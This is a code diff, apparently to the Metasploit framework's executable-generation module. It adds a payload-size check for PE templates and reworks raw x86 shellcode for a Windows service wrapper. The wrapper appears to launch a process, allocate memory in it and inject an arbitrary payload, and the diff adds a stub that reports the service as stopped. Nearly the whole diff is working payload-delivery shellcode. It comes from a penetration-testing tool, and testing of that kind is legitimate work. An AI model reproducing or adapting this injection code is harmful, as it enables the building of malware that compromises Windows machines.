@@ -345,6 +345,9 @@ require 'msf/core/exe/segment_injector'
       characteristics = sec[1][characteristics_offset,0x4].unpack('L')[0]
 
       if (virtualAddress...virtualAddress+sizeOfRawData).include?(pe.hdr.opt.AddressOfEntryPoint)
+        if sizeOfRawData<code.length
+          raise RuntimeError, "The EXE::Template doesn't contain enough place to write the payload."
+        end
         # put this section writable
         characteristics |= 0x8000_0000
         newcharacteristics = [characteristics].pack('L')
@@ -518,11 +521,21 @@ require 'msf/core/exe/segment_injector'
       precode_size = 0xc6
       svcmain_code_offset = precode_size + pushed_service_name.length
 
-      precode_size += 0x06
+      precode_size = 0xcc
       hash_code_offset = precode_size + pushed_service_name.length
 
-      precode_size -= 0x0d
+      precode_size = 0xbf
       svcctrlhandler_code_offset = precode_size + pushed_service_name.length
+
+      code_service_stopped =
+        "\xE8\x00\x00\x00\x00\x5F\xEB\x07\x58\x58\x58\x58\x31\xC0\xC3" +
+         pushed_service_name+"\x89\xE1\x8D\x47\x03\x6A\x00" +
+        "\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5\x6A\x00\x6A\x00\x6A\x00\x6A" +
+        "\x00\x6A\x00\x6A\x00\x6A\x01\x6A\x10\x89\xE1\x6A\x00\x51\x50\x68" +
+        "\xC6\x55\x37\x7D\xFF\xD5\x57\x68\xF0\xB5\xA2\x56\xFF\xD5"
+
+      precode_size = 0x42
+      shellcode_code_offset = code_service_stopped.length + precode_size
 
       # code_service could be encoded in the future
       code_service =
@@ -549,12 +562,13 @@ require 'msf/core/exe/segment_injector'
         "\x6C\x6C\x33\x32\x68\x72\x75\x6E\x64\x89\xE1\x56\x50\x57\x57\x6A" +
         "\x44\x57\x57\x57\x51\x57\x68\x79\xCC\x3F\x86\xFF\xD5\x8B\x0E\x6A" +
         "\x40\x68\x00\x10\x00\x00\x68"+[code.length].pack('<I')+"\x57\x51\x68\xAE\x87" +
-        "\x92\x3F\xFF\xD5\xE8\x00\x00\x00\x00\x5A\x89\xC7\x8B\x0E\x8D\x52" +
-        "\x47\x54\x68"+[code.length].pack('<I')+"\x52\x50\x51\x68\xC5\xD8\xBD\xE7\xFF" +
+        "\x92\x3F\xFF\xD5\xE8\x00\x00\x00\x00\x5A\x89\xC7\x8B\x0E\x81\xC2" +
+         [shellcode_code_offset].pack('<I')+"\x54\x68"+[code.length].pack('<I') +
+        "\x52\x50\x51\x68\xC5\xD8\xBD\xE7\xFF" +
         "\xD5\x31\xC0\x8B\x0E\x50\x50\x50\x57\x50\x50\x51\x68\xC6\xAC\x9A" +
         "\x79\xFF\xD5\x8B\x0E\x51\x68\xC6\x96\x87\x52\xFF\xD5\x8B\x4E\x04" +
-        "\x51\x68\xC6\x96\x87\x52\xFF\xD5\x57\x68\xF0\xB5\xA2\x56\xFF\xD5"
-
+        "\x51\x68\xC6\x96\x87\x52\xFF\xD5" +
+         code_service_stopped
 
       return to_winpe_only(framework, code_service + code, opts)
     end
